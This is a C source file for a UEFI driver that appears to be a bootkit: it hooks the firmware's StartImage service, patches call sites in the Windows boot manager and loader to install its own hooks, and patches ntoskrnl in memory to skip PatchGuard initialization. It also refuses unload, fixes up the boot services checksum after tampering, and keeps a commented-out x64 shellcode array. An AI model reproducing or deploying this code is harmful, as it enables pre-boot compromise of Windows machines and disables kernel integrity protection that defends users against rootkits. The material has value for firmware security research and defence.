#pragma warning(disable: 4996)

#include <Library/DevicePathLib.h>
#include <Library/BaseMemoryLib.h>
#include <Library/BaseLib.h>
#include <Protocol/SerialIo.h>
#include <Base.h>

//
// Shell Library
//
#include <Library/DebugLib.h>

#include "drv.h"
#include "asm.h"
#include "arc.h"
#include "utils.h"
#include "types.h"

#include "bootloader.h"
#include "globals.h"


EFI_HANDLE	gImageHandle;
EFI_SYSTEM_TABLE	*gSystemTable;
EFI_BOOT_SERVICES	*gBootServices;
EFI_RUNTIME_SERVICES	*gRuntimeServices;

#define PAGE_SIZE 0x1000
//
// We support unload (but deny it)
//
const UINT8 _gDriverUnloadImageCount = 1;

//
// We require at least UEFI 2.0
//
const UINT32 _gUefiDriverRevision = 0x200;
const UINT32 _gDxeRevision = 0x200;

//
// Our name
//
CHAR8 *gEfiCallerBaseName = "UefiDriver";

//EFI_LOADED_IMAGE_PROTOCOL *gLoadedImageProtocol;
//EFI_EXIT_BOOT_SERVICES g_pOrgExitBootService = NULL;
EFI_IMAGE_LOAD g_pImageLoad = NULL;
EFI_IMAGE_START g_pImageStart = NULL;

//void *Base = NULL;
EFI_IMAGE_NT_HEADERS *pHeaders = NULL;

PKLDR_DATA_TABLE_ENTRY GetLoadedModule(LIST_ENTRY* LoadOrderListHead, CHAR16* ModuleName)
{
	if (ModuleName == NULL || LoadOrderListHead == NULL)
		return NULL;

	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
	{
		PKLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);

		if (Entry && (StrnCmp(Entry->BaseImageName.Buffer, ModuleName, Entry->BaseImageName.Length) == 0))
		{
			return Entry;
		}

	}

	return NULL;
}

VOID PrintLoadedModules(LIST_ENTRY* LoadOrderListHead, CHAR16 *Dest)
{
	//CatSPrint(Dest, L"%s - Module List:\r\n", Name);

	if (LoadOrderListHead == NULL)
		return;

	//CHAR16 *p = buf;
	for (LIST_ENTRY* ListEntry = LoadOrderListHead->ForwardLink; ListEntry != LoadOrderListHead; ListEntry = ListEntry->ForwardLink)
	{
		//PKLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(ListEntry, KLDR_DATA_TABLE_ENTRY, InLoadOrderLinks);
		PBLDR_DATA_TABLE_ENTRY Entry = CONTAINING_RECORD(ListEntry, BLDR_DATA_TABLE_ENTRY, KldrEntry.InLoadOrderLinks);

		if (Entry)
		{
			//CatSPrint(Dest, L"%s\r\n", Entry->BaseImageName.Buffer);
			StrnCat(Dest, Entry->KldrEntry.BaseImageName.Buffer , Entry->KldrEntry.BaseImageName.Length);
			StrnCat(Dest, L" ", sizeof(L" "));
			StrnCat(Dest, Entry->CertificateIssuer.Buffer, Entry->CertificateIssuer.Length);
			StrnCat(Dest, L" ", sizeof(L" "));
		}

	}
}

EFI_STATUS
EFIAPI
UefiUnload(
	IN EFI_HANDLE ImageHandle
)
{
	//
	// Do not allow unload
	//
	return EFI_ACCESS_DENIED;
}


UINT8 * UtilFindPattern2(VOID* Based, UINT32 Size, const unsigned char* pattern, const char* mask)
{
	UINT32 pos = 0;
	UINT32 maskLength = sizeof(mask) - 1;

	for (UINT32 i = 0; i < Size - maskLength; i += 1)
	{
		UINT8 *Code = RVATOVA(Based, i);

		if (*(Code) == pattern[pos] || mask[pos] == '?')
		{
			if (mask[pos + 1] == '\0')
			{
				Print(L"FOund!\r\n");
				return Code;
			}
			//if(*(Code) == pattern[pos])
			//	Print(L"\r\nFOUND SINGLE %lx \r\n", *(Code));
			pos++;
		}
		else
		{
			pos = 0;
			//Print(L"%lx", *(Code));
		}
	}

	return NULL;
}

VOID
EFIAPI
InitializeLib(
	IN EFI_HANDLE			ImageHandle,
	IN EFI_SYSTEM_TABLE	*SystemTable
)
{
	gImageHandle = ImageHandle;
	gSystemTable = SystemTable;
	gBootServices = gSystemTable->BootServices;
	gRuntimeServices = gSystemTable->RuntimeServices;
	gBS = gBootServices;
	gST = SystemTable;
	gRT = gRuntimeServices;
}

VOID
EFIAPI
CallbackExitBootServices(
	IN  EFI_EVENT	Event,
	IN  VOID      *Context
)
{
	/*CHAR8 *dest = NULL;
	//UnicodeStrToAsciiStr(b.Extension->SmbiosVersion.Buffer, dest);

	//AsciiPrint("%s\r\n", dest);

	unsigned char messageBox64bit_sc[] = {
	0x48, 0x83, 0xec, 0x28, 0x48, 0x83, 0xe4, 0xf0, 0x65, 0x4c, 0x8b, 0x24,
	0x25, 0x60, 0x00, 0x00, 0x00, 0x4d, 0x8b, 0x64, 0x24, 0x18, 0x4d, 0x8b,
	0x64, 0x24, 0x20, 0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x7c, 0x24, 0x20,
	0x4d, 0x8b, 0x24, 0x24, 0x4d, 0x8b, 0x64, 0x24, 0x20, 0xba, 0x8e, 0x4e,
	0x0e, 0xec, 0x4c, 0x89, 0xe1, 0xe8, 0x68, 0x00, 0x00, 0x00, 0xeb, 0x34,
	0x59, 0xff, 0xd0, 0xba, 0xa8, 0xa2, 0x4d, 0xbc, 0x48, 0x89, 0xc1, 0xe8,
	0x56, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc3, 0x4d, 0x31, 0xc9, 0xeb, 0x2c,
	0x41, 0x58, 0xeb, 0x3a, 0x5a, 0x48, 0x31, 0xc9, 0xff, 0xd3, 0xba, 0x70,
	0xcd, 0x3f, 0x2d, 0x4c, 0x89, 0xf9, 0xe8, 0x37, 0x00, 0x00, 0x00, 0x48,
	0x31, 0xc9, 0xff, 0xd0, 0xe8, 0xc7, 0xff, 0xff, 0xff, 0x75, 0x73, 0x65,
	0x72, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0x00, 0xe8, 0xcf, 0xff, 0xff,
	0xff, 0x54, 0x68, 0x69, 0x73, 0x20, 0x69, 0x73, 0x20, 0x66, 0x75, 0x6e,
	0x21, 0x00, 0xe8, 0xc1, 0xff, 0xff, 0xff, 0x30, 0x78, 0x64, 0x65, 0x61,
	0x64, 0x62, 0x65, 0x65, 0x66, 0x00, 0x49, 0x89, 0xcd, 0x67, 0x41, 0x8b,
	0x45, 0x3c, 0x67, 0x45, 0x8b, 0xb4, 0x05, 0x88, 0x00, 0x00, 0x00, 0x45,
	0x01, 0xee, 0x67, 0x45, 0x8b, 0x56, 0x18, 0x67, 0x41, 0x8b, 0x5e, 0x20,
	0x44, 0x01, 0xeb, 0x67, 0xe3, 0x3f, 0x41, 0xff, 0xca, 0x67, 0x42, 0x8b,
	0x34, 0x93, 0x44, 0x01, 0xee, 0x31, 0xff, 0x31, 0xc0, 0xfc, 0xac, 0x84,
	0xc0, 0x74, 0x07, 0xc1, 0xcf, 0x0d, 0x01, 0xc7, 0xeb, 0xf4, 0x39, 0xd7,
	0x75, 0xdd, 0x67, 0x41, 0x8b, 0x5e, 0x24, 0x44, 0x01, 0xeb, 0x31, 0xc9,
	0x66, 0x67, 0x42, 0x8b, 0x0c, 0x53, 0x67, 0x41, 0x8b, 0x5e, 0x1c, 0x44,
	0x01, 0xeb, 0x67, 0x8b, 0x04, 0x8b, 0x44, 0x01, 0xe8, 0xc3
	};
	*/

	//gBS->AllocatePool(EfiRuntimeServicesCode, sizeof(messageBox64bit_sc), (VOID**)&messageBox64bit_sc);

	Print(L"%s\r\n", g_LoadOrderModules);
	//Print(L"%s\r\n", g_CoreDrivers);
	__debugbreak();
	UtilWaitForKey();
	Print(L"exit bs\r\n");
}

VOID EFIAPI hkOslArchTransferToKernel(PLOADER_PARAMETER_BLOCK KernelParams, VOID *KiSystemStartup)
{
	//
	// Before we do anything, restore original call bytes
	//

	__debugbreak();

	*(UINT32*)(OslArchTransferToKernelCallPatchLocation + 1) = *(UINT32*)(OslArchTransferToKernelCallBackup + 1);


	//CopyMem(&b, KernelParams, sizeof(LOADER_PARAMETER_BLOCK));

	PKLDR_DATA_TABLE_ENTRY KernelEntry = NULL;
	VOID* KernelBase = NULL;
	UINT32 KernelSize = 0;

	KernelEntry = GetLoadedModule(&KernelParams->LoadOrderListHead, L"ntoskrnl.exe");


	if (KernelEntry)
	{
		KernelBase = KernelEntry->ImageBase;
		KernelSize = KernelEntry->SizeOfImage;
	}

	if (KernelBase && KernelSize)
	{
		//
		// Find patch guard initialization function
		//
		UINT8* Found = NULL;
		EFI_STATUS Status = UtilFindPattern(sigInitPatchGuard, 0xCC, sizeof(sigInitPatchGuard), KernelBase, KernelSize, (VOID**)&Found);
		if (Status == EFI_SUCCESS)
		{
			InitPatchGuardPatchLocation = (VOID*)Found;
			//
			// Patch to force a jump to skip PG initialization
			//
			*(UINT8*)Found = 0xEB;
		}
	}

	//Print(L"z");

	//KernelParams->RegistryBase = (VOID*)0x10000;

	oOslArchTransferToKernel(KernelParams, KiSystemStartup);
}

VOID EFIAPI hkOslFwpKernelSetupPhase1(PLOADER_PARAMETER_BLOCK a1)
{
	*(UINT32*)(OslFwpKernelSetupPhase1PatchLocation + 1) = *(UINT32*)(OslFwpKernelSetupPhase1Backup + 1);
	//oDbgPrint("testing123");

	//__debugbreak();

	//gBlock = &a1;

	PrintLoadedModules(&a1->LoadOrderListHead, g_LoadOrderModules);
	//PrintLoadedModules(&a1->CoreDriverListHead, g_CoreDrivers, L"Core")

	__debugbreak();

	oOslFwpKernelSetupPhase1(a1);
}

__int64 hkRtlImageNtHeaderEx(int a1, unsigned __int64 Base, unsigned __int64 Size, unsigned __int64 *a4)
{
	*(UINT32*)(ImgArchEfiStartBootApplicationPatchLocation + 1) = *(UINT32*)(ImgArchEfiStartBootApplicationBackup + 1);

	UINT8* Found = NULL;;

	EFI_STATUS EfiStatus = UtilFindPattern(sigOslArchTransferToKernelCall, 0xCC, sizeof(sigOslArchTransferToKernelCall), (VOID*)Base, (UINT32)Size, (VOID**)&Found);
	
	if (EfiStatus == EFI_SUCCESS)
	{
		Print(L"Found OslArchTransferToKernel call at %lx\r\n", Found);

		oOslArchTransferToKernel = (tOslArchTransferToKernel)UtilCallAddress(Found);

		Print(L"final addr: %lx\r\n", oOslArchTransferToKernel);
		//DbgMsg(__FILE__, __LINE__, "here\r\n");

		OslArchTransferToKernelCallPatchLocation = (VOID*)Found;
		//OslArchTransferToKernelCallPatchLocation = (VOID*)Found;
		CopyMem((VOID*)OslArchTransferToKernelCallBackup, (VOID*)Found, 5);

		// Do patching 
		//*(UINT8*)Found = 0xE8;
		//*(UINT32*)(Found + 1) = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkOslArchTransferToKernel);
	}
	else
	{
		Print(L"\r\nImgArchEfiStartBootApplication error, failed to find OslArchTransferToKernel patch location. Status: %lx\r\n", EfiStatus);
	}

	UINT8* FoundSetup = NULL;
	EfiStatus = UtilFindPattern(sigOslFwpKernelSetupPhase1, 0xCC, sizeof(sigOslFwpKernelSetupPhase1), (VOID*)Base, (UINT32)Size, (VOID**)&FoundSetup);

	if (EfiStatus == EFI_SUCCESS)
	{
		oOslFwpKernelSetupPhase1 = (tOslFwpKernelSetupPhase1)UtilCallAddress(FoundSetup);
		OslFwpKernelSetupPhase1PatchLocation = (VOID*)FoundSetup;
		CopyMem((VOID*)OslFwpKernelSetupPhase1Backup, (VOID*)FoundSetup, 5);

		// Do patching 
		*(UINT8*)FoundSetup = 0xE8;
		*(UINT32*)(FoundSetup + 1) = UtilCalcRelativeCallOffset((VOID*)FoundSetup, (VOID*)&hkOslFwpKernelSetupPhase1);
	}
	else
	{
		Print(L"Failed to find FwpKernelSetup\r\n");
	}

	return oRtlImageNtHeaderEx(a1, Base, Size, a4);
}

EFI_STATUS
hkImageStart(
	IN  EFI_HANDLE                  ImageHandle,
	OUT UINTN                       *ExitDataSize,
	OUT CHAR16                      **ExitData    OPTIONAL
)
{

	gBS->StartImage = g_pImageStart;

	EFI_STATUS				Status;
	EFI_LOADED_IMAGE_PROTOCOL		*Image;
	CHAR16					*FilePathText = NULL;

	Print(L"->StartImage(0x%lx, , )\n", ImageHandle);

	//
	// Get gEfiLoadedImageProtocolGuid for image that is starting
	//
	Status = gBS->OpenProtocol(
		ImageHandle,
		&gEfiLoadedImageProtocolGuid,
		(VOID **)&Image,
		gImageHandle,
		NULL,
		EFI_OPEN_PROTOCOL_GET_PROTOCOL
	);
	if (Status != EFI_SUCCESS) {
		Print(L"ERROR: OStartImage: OpenProtocol(gEfiLoadedImageProtocolGuid) = %r\n", Status);
		return EFI_INVALID_PARAMETER;
	}

	//
	Print(L" Image: %p - %x (%x)\n", Image->ImageBase, (UINTN)Image->ImageBase + Image->ImageSize, Image->ImageSize);
	//UtilWaitForKey();
	Status = gBS->CloseProtocol(ImageHandle, &gEfiLoadedImageProtocolGuid, gImageHandle, NULL);
	if (EFI_ERROR(Status)) {
		Print(L"CloseProtocol error: %r\n", Status);
	}

	UINT8* Found = NULL;
	EFI_STATUS EfiStatus = UtilFindPattern(
		sigRtl,
		0xCC,
		sizeof(sigRtl),
		Image->ImageBase,
		(UINT32)Image->ImageSize,
		(VOID**)&Found);

	if (!EFI_ERROR(EfiStatus))
	{
		// Found address, now let's do our patching
		UINT32 NewCallRelative = 0;

		Print(L"Found ImgArchEfiStartBootApplication call at %lx\n", Found);

		// Save original call

		UINT8 *orig = NULL;
		UINT8 origSig[] = { 0x45, 0x33, 0xD2, 0x4D, 0x8B, 0xD8 };
		UtilFindPattern(origSig, 0xCC, sizeof(origSig), Image->ImageBase, (UINT32)Image->ImageSize, (VOID**)&orig);
		oRtlImageNtHeaderEx = (tRtlImageNtHeaderEx)(orig);

		Print(L"call address %lx\r\n", oRtlImageNtHeaderEx);

		// Backup original bytes and patch location before patching
		ImgArchEfiStartBootApplicationPatchLocation = (VOID*)Found;

		Print(L"Original address %lx\r\n", ImgArchEfiStartBootApplicationPatchLocation);
		CopyMem(ImgArchEfiStartBootApplicationBackup, ImgArchEfiStartBootApplicationPatchLocation, 5);
		// Patch call to jump to our hkImgArchEfiStartBootApplication hook
		NewCallRelative = UtilCalcRelativeCallOffset((VOID*)Found, (VOID*)&hkRtlImageNtHeaderEx);
		Print(L"offset %lx\r\n", NewCallRelative);

		*(UINT8*)Found = 0xE8; // Write call opcode
		*(UINT32*)(Found + 1) = NewCallRelative; // Write the new relative call offset
	}
	else
	{
		Print(L"\r\nPatchWindowsBootManager error, failed to find Archpx64TransferTo64BitApplicationAsm patch location. Status: %lx\r\n", EfiStatus);
	}

	FreePool(FilePathText);
	Status = g_pImageStart(ImageHandle, ExitDataSize, ExitData);

	return Status;
}

/*EFI_STATUS EFIAPI hkExitBootServices(EFI_HANDLE ImageHandle, UINTN MapKey)
{
	Print(L"@ ExitBootServices\r\n");

	if (gBlock != NULL)
	{
		Print(L"And we have a valid ptr %llx\r\n", gBlock);

		UtilWaitForKey();

		//Print(L"Major: %lx\r\n", gBlock->OsMajorVersion);
	}

	gBS->ExitBootServices = g_pOrgExitBootService;

	UINTN i = 0;

	// return address points to winload
	VOID *Addr = (VOID *)((UINTN)ret_ExitBootServices & 0xfffffffffffff000);

	// determinate winload.efi base address
	while (i < PAGE_SIZE * 0x20)
	{
		if (*(UINT16 *)Addr == EFI_IMAGE_DOS_SIGNATURE)
		{
			Base = Addr;
			break;
		}

		Addr = (VOID *)((UINTN)Addr - PAGE_SIZE);
		i += PAGE_SIZE;
	}

	if (Base != NULL)
	{
		//UINT8* Found = NULL;

		//void *origBase = Base;
		pHeaders = (EFI_IMAGE_NT_HEADERS *)RVATOVA(Base, ((EFI_IMAGE_DOS_HEADER *)Base)->e_lfanew);

		//48 8B 3D ? ? ? ? 48 8B CF

		UINT8 sigBlock[] = { 0x48, 0x8B, 0x3D, 0xCC, 0xCC, 0xCC, 0xCC, 0x48, 0x8B, 0xCF };
		UINT8* blkAddr = NULL;

		EFI_STATUS FindBlk = UtilFindPattern(sigBlock, 0xCC, sizeof(sigBlock), Base, pHeaders->OptionalHeader.SizeOfImage, (VOID**)&blkAddr);

		if (FindBlk == EFI_SUCCESS)
		{
			const UINT32 offset = *(UINT32*)(blkAddr + 3);

			// LOADER_PARAMETER_BLOCK *ldrAddress = (LOADER_PARAMETER_BLOCK*)(blkAddr + 7 + offset);
			//LOADER_PARAMETER_BLOCK ldrAddress = *(LOADER_PARAMETER_BLOCK*)(blkAddr + 7 + offset);

			Print(L"blkAddr %lx\r\n", blkAddr);

			const UINT32 *ldrAddress = (UINT32*)(blkAddr + 7 + offset);

			Print(L"Local address %lx\r\n", ldrAddress);

			UINT64 value = *(UINT64*)ldrAddress;

			Print(L"Real address %llx\r\n", value);

			LOADER_PARAMETER_BLOCK **block = (LOADER_PARAMETER_BLOCK**)((UINT32*)ldrAddress);

			Print(L"block %llx %llx\r\n", block, *block);

			EFI_STATUS p = gRT->ConvertPointer(1, block);

			if (p == EFI_SUCCESS)
				Print(L"block %llx %llx\r\n", block, *block);


			//PLOADER_PARAMETER_BLOCK jj = &(*(LOADER_PARAMETER_BLOCK*)ldrAddress);

			//Print(L"Check em out %llx\r\n", &jj);

			//Print(L"Check em out %llx\r\n", jj->OsMajorVersion);



			//PLOADER_PARAMETER_BLOCK ldrAddress = (PLOADER_PARAMETER_BLOCK)0x9364F0;

			//LOADER_PARAMETER_BLOCK b;

			//gBS->CopyMem(&b, (VOID**)&ldrAddress, sizeof(LOADER_PARAMETER_BLOCK));

			//Print(L"my var %lx\r\n", &b);

			// ldrAddress (9A6380) is a pointer that points to the PLOADER_BLOCK in memory (FFF....D0)

			/*UINT64 value = *ldrAddress;

			Print(L"Real struct address: %lx\r\n", value);

			LOADER_PARAMETER_BLOCK *b = NULL;

			b = (LOADER_PARAMETER_BLOCK **)&ldrAddress;

			Print(L"My pointer: %lx, %lx \r\n", b, &b);

			Print(L"shit fucker %lx\r\n", b->OsMajorVersion);
			*/


			//LOADER_PARAMETER_BLOCK **gGlobalPointer = &ldrAddress;

			//Print(L"Loader Address: %llx\r\n", gGlobalPointer);
			//Print(L"Loader Address: %llx\r\n", &gGlobalPointer);

			//PLOADER_PARAMETER_BLOCK gGlobalPointer = (PLOADER_PARAMETER_BLOCK)ldrAddress;

			//gRT->ConvertPointer(EFI_OPTIONAL_PTR, (VOID **)&b);

			//Print(L"third address %lx\r\n", b->OsMajorVersion);

			//Print(L"done\r\n");
			//Print(L"Loader Address: %llx\r\n", gGlobalPointer);

			//Print(L"testing: %lu\r\n", ldrAddress.OsMajorVersion);


			//UINT64 *addr = (UINT64*)ldrAddress;

			//Print(L"Loader Address 2 : %llx %p %p\r\n", addr, addr, &addr);


			//UINT64 value;

			//value = *ldrAddress;

			// value prints the real address!!!
			//Print(L"Loader Address: %llx\r\n", value);

			//UINT64 *block = (UINT64*)value;


			//LOADER_PARAMETER_BLOCK p = *(LOADER_PARAMETER_BLOCK *)value;

			//PLOADER_PARAMETER_BLOCK b = (PLOADER_PARAMETER_BLOCK)p;

			//PLOADER_PARAMETER_BLOCK b = (PLOADER_PARAMETER_BLOCK)(value);


			/*int var = 789;

			// pointer for var
			int *ptr2;

			// double pointer for ptr2
			int **ptr1;

			// storing address of var in ptr2
			ptr2 = &var;

			// Storing address of ptr2 in ptr1
			ptr1 = &ptr2;


			LOADER_PARAMETER_BLOCK **p = (PLOADER_PARAMETER_BLOCK)((blkAddr + 7 + offset));

			Print(L"Should be same %llx\r\n", p);



			LOADER_PARAMETER_BLOCK **dbl;

			//Print(L"Test: %lu\r\n", (*(&ldrAddress))->OsMajorVersion);

			Print(L"Test: %lu\r\n", (*ldrAddress)->OsMajorVersion);

			dbl = &ldrAddress;

			Print(L"Test 2: %lu\r\n", (*dbl)->OsMajorVersion);

			Print(L"ldr addr %llx\r\n", &ldrAddress->OsMajorVersion);

			Print(L"ldr addr %lu\r\n", ldrAddress->OsMajorVersion);
			*/

			//PKLDR_DATA_TABLE_ENTRY KernelEntry = NULL;
			//VOID* KernelBase = NULL;
			//UINT32 KernelSize = 0;

			//Print(L"loadorder %lx", &PBlock.LoadOrderListHead);

			//__debugbreak();

			//UtilWaitForKey();

			//KernelEntry = GetLoadedModule(&PBlock->LoadOrderListHead, L"ntoskrnl.exe");

			/*
			if (KernelEntry)
			{
			KernelBase = KernelEntry->ImageBase;
			KernelSize = KernelEntry->SizeOfImage;
			}

			if (KernelBase && KernelSize)
			{
			//
			// Find patch guard initialization function
			//
			UINT8* Found = NULL;
			EFI_STATUS Status = UtilFindPattern(sigInitPatchGuard, 0xCC, sizeof(sigInitPatchGuard), KernelBase, KernelSize, (VOID**)&Found);
			if (Status == EFI_SUCCESS)
			{
			InitPatchGuardPatchLocation = (VOID*)Found;
			//
			// Patch to force a jump to skip PG initialization
			//
			*(UINT8*)Found = 0xEB;
			}
			}


			UtilWaitForKey();

			//Print(L"Found blk call at %lx\r\n", *(UINT32*)(Found2 + 3));
			//PLOADER_PARAMETER_BLOCK blk2 = NULL;
			//blk2 = (PLOADER_PARAMETER_BLOCK)&ldrblk;

			/*Print(L"%s\r\n", blk2->NtBootPathName);

			Print(L"%s\r\n", blk2->Extension->EfiVersion.Buffer);
			Print(L"%lx\r\n", blk2->OsMajorVersion);
			Print(L"%lx\r\n", blk2->RegistryLength);
			&/
			/*PKLDR_DATA_TABLE_ENTRY KernelEntry = GetLoadedModule(&blk2->LoadOrderListHead, L"ntoskrnl.exe");
			if (KernelEntry)
			{
			Print(L"got it %lx", KernelEntry->DllBase);
			//KernelBase = KernelEntry->ImageBase;
			Print(L"Size %lx\r\n", KernelEntry->SizeOfImage);
			//KernelSize = KernelEntry->SizeOfImage;
			}


		}

		//\x48\x8B\x3D\x00\x00\x00\x00\x48\x8B\xCF xxx????xxx

	}

	return g_pOrgExitBootService(ImageHandle, MapKey);
}*/

EFI_STATUS
EFIAPI
UefiMain(
	IN EFI_HANDLE ImageHandle,
	IN EFI_SYSTEM_TABLE *SystemTable
)
{
	EFI_STATUS efiStatus;

	InitializeLib(ImageHandle, SystemTable);

	efiStatus = EfiLibInstallDriverBindingComponentName2(ImageHandle,
		SystemTable,
		&gDriverBindingProtocol,
		ImageHandle,
		&gComponentNameProtocol,
		&gComponentName2Protocol);

	EFI_EVENT Event;
	gBootServices->CreateEventEx(0x200, 0x10, &CallbackExitBootServices, NULL, &EXIT_BOOT_SERVICES_GUID, &Event);

	g_pImageStart = gBS->StartImage;
	gBS->StartImage = hkImageStart;

	gBS->Hdr.CRC32 = 0;
	gBS->CalculateCrc32(gBS, gBS->Hdr.HeaderSize, &gBS->Hdr.CRC32);

	return efiStatus;
}
